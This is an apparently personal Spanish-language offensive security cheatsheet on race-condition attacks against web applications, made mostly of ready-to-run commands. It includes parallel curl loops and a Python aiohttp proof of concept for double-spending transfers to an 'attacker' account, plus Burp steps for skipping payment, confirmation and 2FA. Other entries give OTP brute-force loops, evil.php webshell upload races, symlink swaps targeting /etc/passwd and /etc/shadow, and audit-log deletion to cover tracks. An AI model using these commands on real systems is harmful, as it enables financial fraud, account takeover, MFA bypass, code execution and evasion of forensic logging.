---
aliases:
  - Limit Overrun
  - OTP Race
  - TOCTOU Race
  - State Machine Race
tags:
  - type/cheatsheet
  - vuln/race-condition
  - technique/initial-access
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Race Conditions]]'
---
# Race Conditions - Tipos

***

## Limit Overrun

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater → group requests → "Send group in parallel (single connection)" con request `POST /api/transfer {"to":"attacker","amount":1000}` × 20 | Spend balance múltiples veces (same balance leído pre-decrement) | Endpoint sin lock atómico. |
| `for i in {1..20}; do curl -X POST -b "session=$T" -d '{"to":"attacker","amount":1000}' https://target/api/transfer & done; wait` | Bash parallel — quick race attempt | Sin Burp disponible. |
| Turbo Intruder script `engine.queue(req); engine.queue(req); ...` con `concurrentConnections=20, requestsPerConnection=1` | Volume race con HTTP/2 single-packet | Apps detrás de HTTP/2. |
| `python3 -c "import asyncio,aiohttp; async def f(s,i): async with s.post('https://target/api/redeem',json={'code':'PROMO'}) as r: print(r.status); ..."` (full async snippet ver code block) | Async parallel redemption attempts | Voucher 1-time-use overrun. |
| Send 50 concurrent `POST /api/keys` con cap "max 5" | Generate >5 API keys | Quota bypass. |
| Send 100 concurrent `POST /vote` con cap "1 per user" | Multiple votes mismo user | Voting manipulation. |
| Send 2 concurrent `POST /withdraw {"amount":1000}` con balance $1000 | Doble withdrawal — balance va -$1000 | Financial. |
| Send 100 concurrent `POST /refund {"amount":9.99}` (auto-approve <$10) | Loop refunds bypass single-approval-per-day | Threshold race. |
^race-type-limit

### Async PoC (Python aiohttp)

```python
import asyncio, aiohttp

async def fire(session, idx):
    async with session.post(
        'https://target.com/api/transfer',
        json={'to':'attacker','amount':1000},
        cookies={'session':'TOKEN'}
    ) as r:
        print(f"[{idx}] {r.status}")

async def main():
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(*[fire(s, i) for i in range(20)])

asyncio.run(main())
```

___

## Multi-Step State Machine

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater group: `POST /order/123/pay` + `POST /order/123/ship` parallel | Ship sin pay completo | Status check race. |
| Turbo Intruder con queue secuencial pero 0ms delay: `engine.queue(req_pay); engine.queue(req_ship)` | Race entre pay y ship | State transition gap. |
| `curl -X POST -b "$C" https://target/checkout/cart & curl -X POST -b "$C" https://target/checkout/ship & wait` | Skip pay step en checkout | Multi-step checkout. |
| `for ep in 'submit-kyc' 'verify-email' 'verify-phone' 'activate'; do curl -X POST -b "$C" https://target/api/$ep & done; wait` | Parallel KYC steps — race salta verify | Onboarding bypass. |
| Burp parallel: `POST /refund/request` + `POST /refund/execute` | Execute refund sin approval | Refund flow bypass. |
| Burp parallel: `POST /grant_request` + `POST /grant_execute` con privilege | Privesc grant sin admin approve | Approval flow bypass. |
| Burp parallel: `POST /upload` + `POST /publish` | Publish sin scan complete | Malware-via-upload. |
^race-type-state-machine

### Workflow exploit state machine

```
1. Map flow: enumerar steps + endpoints + state transitions.
2. Identify final action (que tiene gate check).
3. Burp Repeater → "Send group in parallel" con early step + final action.
4. Si race window: final action procesa antes de gate check completa.

Ejemplo:
  Endpoint A: /order/123/pay   (check status=='reviewed')
  Endpoint B: /order/123/ship  (check status=='paid')

Race: A+B simultaneously
  → B verifica antes de A complete → status='reviewed' falla check
  → Pero si check === status (lazy lookup) y A modifica simultaneously
    → B puede leer 'reviewed' como input pero update a 'shipped' después
```

___

## Confirmation Step Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp parallel: `POST /account/delete` + `POST /account/confirm-delete` | Execute delete sin verify confirm code | Confirm gate race. |
| Burp parallel: `PUT /password` + `POST /password/confirm` | Skip old password verification | Password change race. |
| Burp parallel: `PUT /email` + `POST /email/confirm-change` | Email change sin verification | Email hijack. |
| Burp parallel: `POST /transfer/big {"amount":50000}` + `POST /transfer/confirm` | Skip email confirm en big transfer | Financial high-impact. |
| Burp parallel: `POST /admin/permissions` + `POST /confirm` | Skip 2FA en admin action | Permission grant. |
| Burp parallel: `DELETE /audit/logs` + `POST /confirm` | Cover tracks sin admin confirm | Forensic evasion. |
^race-type-confirm

___

## 2FA / OTP Race

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Intruder Turbo Intruder con 6-digit numeric `0000-9999`, 100 concurrent | OTP brute via race condition (mark-as-used race) | OTP single-use sin atomic check. |
| `for code in $(seq -w 0 999999); do (curl -X POST -d "otp=$code" https://target/api/2fa/verify -b "$C" &); done` (con throttle) | Bash parallel OTP brute | Manual variant. |
| Burp parallel: `POST /2fa/verify {"code":"123456"}` × 100 con mismo code | Race entre validate + mark-used | Mark-used no atómico. |
| Burp parallel: `POST /2fa/disable` + `POST /confirm` | Disable 2FA sin confirm code | 2FA weakening. |
| Burp parallel: `POST /enroll-2fa/start` + `POST /enroll-2fa/skip` | Skip enrollment | Bypass mandatory MFA. |
| Send same magic link N veces concurrent: `for i in {1..50}; do curl https://target/login?token=$T &; done; wait` | Magic link reuse | Single-use enforcement race. |
^race-type-2fa

___

## File Upload Race

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -F "file=@evil.php" https://target/upload &` + en paralelo `for i in {1..100}; do curl https://target/uploads/evil.php; done` | Access file durante scan window → execute antes de scan delete | AV scan TOCTOU. |
| Burp paralelo: upload `evil.php` + N requests a `/uploads/evil.php` | Webshell exec antes de antivirus rename | Standard upload race. |
| Upload archivo + race access antes de rename `.txt`: `curl -F "file=@evil.php" ... &; sleep 0.05; curl https://target/uploads/evil.php` | Pre-rename window | App rename post-validate. |
| Two concurrent uploads same filename: `curl -F "file=@evil.php" https://target/upload & curl -F "file=@safe.txt" https://target/upload` | Last-write-wins → atacante's content persists | Filename collision. |
| Symlink race: upload symlink → app processes symlink target post-validation | Read sensitive file via symlink | Server-side processing. |
| Image processing race: upload + access mid-resize | Half-processed access | resize() pipeline. |
^race-type-fileupload

___

## TOCTOU Filesystem

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `while true; do ln -sf /etc/passwd /tmp/file; rm -f /tmp/file; done` (loop concurrent al server access) | Symlink race read sensitive | App valida + read filesystem. |
| `while true; do echo "safe" > /tmp/file; echo "evil_payload" > /tmp/file; done` | File content swap entre validate + execute | Server validate-then-exec. |
| `while true; do chmod 4755 /tmp/uploaded; done` (concurrent al uso del archivo) | SUID set entre upload + chmod 644 | Permission race. |
| `for i in {1..1000}; do ln /etc/shadow /tmp/file; rm /tmp/file; done` | Hard link race | Hard link write target. |
| `inotifywait -m /tmp` para monitorear app file ops + race con symlink swap | Real-time TOCTOU detection | Triggered race. |
| Trigger via curl + parallel symlink swap: `(curl https://target/process-file?path=/tmp/x &); ln -sf /etc/shadow /tmp/x` | Pipeline TOCTOU | Server-side process race. |
^race-type-toctou-fs

***
